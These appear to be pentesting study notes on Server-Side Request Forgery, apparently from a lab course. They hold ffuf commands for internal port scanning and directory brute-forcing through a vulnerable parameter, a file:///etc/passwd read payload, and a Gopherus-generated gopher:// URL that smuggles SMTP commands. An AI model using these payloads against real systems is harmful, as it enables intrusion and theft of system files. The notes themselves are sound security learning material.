 Server Side Request Forgery or SSRF is a vulnerability in which an attacker forces a server to perform requests on their behalf.

an attacker might be able to coerce the server into making requests to arbitrary URLs 

#### Impact of an SSRF include:
- Accessing Cloud metadata
- Leaking files on the server
- Network discovery, port scanning with the SSRF
- Sending packets to specific services on the network, usually to achieve a Remote Command Execution on another server
- . Accessing restricted endpoints
- --
### Resources
https://vickieli.dev/ssrf/ssrf-in-the-wild/
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery#tools

https://github.com/assetnote/blind-ssrf-chains

https://www.vaadata.com/blog/exploiting-the-ssrf-vulnerability/
https://blog.orange.tw/posts/2017-07-how-i-chained-4-vulnerabilities-on/

##  Bypass Techniques
 reference [PayloadAllTheThings]()
and [bypassing SSRF protections by Vicke Lee ](https://vickieli.dev/ssrf/bypassing-ssrf-protection/) 

---
## Common exploits:
#### **Port Scanning:**

methodology:
 Identify any error messages by inspecting discrepancies between server responses. looking for Error messages and comparing requests could clue us on which ports are open.

generate port numbers
```shell-session
 seq 1 10000 > ports.txt
```

Afterward, we can fuzz all open ports by filtering out responses containing the error message we have identified earlier.

```shell-session
ffuf -w ./ports.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01" -fr "Failed to connect to"
```

#### directory bruteforcing

Accessing Internal websites and performing a directory bruteforce on them:
```shell-session
$ ffuf -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://dateserver.htb/FUZZ.php&date=2024-01-01" -fr "Server at dateserver.htb Port 80"
```
---
### Abusing URL Schemes

#### file Scheme
if it's allowed, we can read arbitrary files on the filesystem, including the web application's source code.
```
file:///etc/passwd
```

#### Gopher Scheme

Can be used to embed requests into a parameter (refer to notes)
generate a valid SMTP URL by supplying the corresponding argument. The tool asks us to input details about the email we intend to send. Afterward, we are given a valid gopher URL that we can use in our SSRF exploitation:

```shell-session
$ python2.7 gopherus.py --exploit smtp


Give Details to send mail: 

Mail from :  attacker@academy.htb
Mail To :  victim@academy.htb
Subject :  HelloWorld
Message :  Hello from SSRF!

Your gopher link is ready to send Mail: 

gopher://127.0.0.1:25/_MAIL%20FROM:attacker%40academy.htb%0ARCPT%20To:victim%40academy.htb%0ADATA%0AFrom:attacker%40academy.htb%0ASubject:HelloWorld%0AMessage:Hello%20from%20SSRF%21%0A.

-----------Made-by-SpyD3r-----------
```

### Other Techniques:

- Leaking Cloud metadata
 - Accessing Internal hosts
---